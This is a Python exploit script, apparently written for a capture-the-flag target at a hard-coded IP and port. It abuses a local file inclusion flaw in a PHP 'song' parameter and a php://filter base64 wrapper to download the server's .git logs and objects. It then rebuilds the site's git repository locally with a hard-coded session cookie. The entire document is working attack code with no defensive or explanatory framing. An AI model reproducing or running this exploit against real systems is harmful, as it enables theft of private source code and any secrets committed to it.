import requests
import os
import base64

print("==========  written by 𝖍𝖆𝖉𝖊𝖘#5218 =========")
objects=[]

#tao git Init
os.system('git init')
#function requests
def req(url,payload):
  r=requests.get(url,headers={"Cookie":"PHPSESSID=5f664e702c079e2b78204f0358991a83"})
  token=r.text.split("value=")[2].split("\"")[1]
  #print(token)
  data={"song":payload,"token":token}

  r1=requests.post(url,data=data,headers={"Cookie":"PHPSESSID=5f664e702c079e2b78204f0358991a83"})
  #print(r1.text)
  result=r1.text.split("pre>")[1].split("</")[0]
  
  return result
#function lay tree
def trees(parrent):
  global objects
  os.system('git cat-file -t '+parrent)
  os.system('git cat-file -p '+parrent+'>test')
  
  f=open("test","r")
  tree=f.read()
  f.close()
  os.remove("test")
  tree1=tree.split("\n")[0].split(" ")[1]
  print(tree1)
  if len(tree) !=40:
    for i in tree.split("\n"):
      try:
        
        if len(i.split(" ")[2][:40]) ==40:
          
          objects.append(i.split(" ")[2][:40])
      except:
        break
  return tree1

#function lay content object
def get_content(filename):
  payload="php://filter/convert.base64-encode/resource=/var/www/html/.git/objects/{}/{}".format(filename[:2],filename[2:])
  content=req(url,payload)
  try:
    os.mkdir("./.git/objects/{}".format(filename[:2]))
  except:
    pass
  f = open("./.git/objects/{}/{}".format(filename[:2],filename[2:]), "wb")
  f.write(base64.b64decode(content))
  f.close()


url="http://61.28.237.24:30102/"
prefix="/var/www/html/.git/"
payload="/var/www/html/.git/logs/refs/heads/main"
object1=req(url,payload)
#print(object1)

#lay ten cac object

for i in object1.split("\n"):
  try:
    objects.append(i.split(" ")[1])
  except:
    break
#print(objects)
  
#lay file object
for filename in objects:
  get_content(filename)
  try:
    treename=trees(filename)
    #print('treename',treename)
    if len(treename)==40:
      get_content(treename)
      try:
        treename=trees(treename)
        #print('treename',treename)
        if len(treename)==40:
          get_content(treename)
          try:
            treename=trees(treename)
            #print('treename',treename)
            if len(treename)!=40:
              for file in objects:
                get_content(file)
      
          except:
            continue
      except:
        continue
  except:
    continue



